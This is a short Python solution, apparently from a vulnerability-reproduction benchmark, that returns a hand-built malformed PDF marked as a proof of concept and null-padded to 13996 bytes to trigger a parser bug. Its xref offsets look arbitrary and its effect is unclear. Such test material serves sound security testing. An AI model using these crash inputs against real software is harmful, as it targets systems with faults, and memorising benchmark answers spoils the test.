class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.4\n%\xC2\xB5\xC2\xB4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 3 3] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< >>\nstream\n\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000010 00000 n \n0000000060 00000 n \n0000000110 00000 n \n0000000180 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n250\n%%EOF'
        # Pad to approximately 13996 bytes with spaces or nulls to simulate a larger malformed PDF
        padding = b'\x00' * (13996 - len(poc))
        return poc + padding
